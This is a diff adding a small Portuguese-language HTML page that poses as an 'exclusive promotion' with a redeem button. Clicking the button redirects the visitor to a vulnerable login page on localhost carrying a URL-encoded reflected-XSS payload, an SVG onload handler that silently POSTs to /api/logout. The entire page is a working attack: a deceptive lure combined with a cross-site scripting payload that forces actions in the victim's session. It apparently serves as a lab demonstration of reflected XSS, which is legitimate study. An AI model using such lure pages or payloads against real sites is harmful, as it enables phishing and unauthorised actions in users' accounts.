@@ -1,0 +1,33 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+
+    <meta charset="UTF-8">
+    <title>Promoção Exclusiva 🎁</title>
+
+</head>
+
+<body>
+
+    <h1>🎁 Promoção exclusiva!</h1>
+    <p>Clique abaixo para resgatar sua oferta</p>
+
+    <button id="btn">Resgatar</button>
+
+    <script>
+        // payload XSS (logout invisível)
+        const payload = encodeURIComponent(
+            `<svg onload="fetch('/api/logout',{method:'POST'})">`
+        );
+
+        document.getElementById("btn").addEventListener("click", () => {
+
+            // redireciona pra aplicação vulnerável com payload
+            window.location.href =
+                `http://localhost:3000/html/login.html?name=${payload}`;
+
+        });
+    </script>
+
+</body>
+</html>
